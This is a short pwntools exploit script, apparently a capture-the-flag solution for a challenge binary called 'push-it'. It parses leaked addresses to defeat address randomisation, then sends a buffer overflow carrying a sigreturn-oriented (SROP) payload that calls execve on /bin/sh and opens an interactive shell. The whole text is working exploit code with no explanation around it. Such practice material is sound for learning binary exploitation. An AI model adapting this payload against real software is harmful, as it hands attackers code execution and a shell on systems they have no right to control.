from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *vuln+165
continue
'''.format(**locals())

exe = './push-it'
elf = context.binary = ELF(exe, checksec=False)

pop_rax_ret = 0x00000000000011c6
syscall = 0x00000000000011d3

p = start()
p.recvuntil(b"<<< Push your way to /bin/sh at : "); shell = int(p.recvline(), 16)
info("\"/bin/sh\" at: " + hex(shell))

p.sendlineafter(b">>> ", b"Y"); p.recvuntil(b"~ push 0x58585858; ret | ");
leak = int(p.recvline(), 16)
base_binary = elf.address = leak - (elf.sym[b'push_1'] + 4)
info("base binary: " + hex(base_binary))

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = shell
frame.rip = syscall + base_binary

payload = flat(
    cyclic(16),
    pop_rax_ret + base_binary,
    0x0f,
    syscall + base_binary,
    frame
)

p.sendlineafter(b">>> ", payload)
p.interactive()

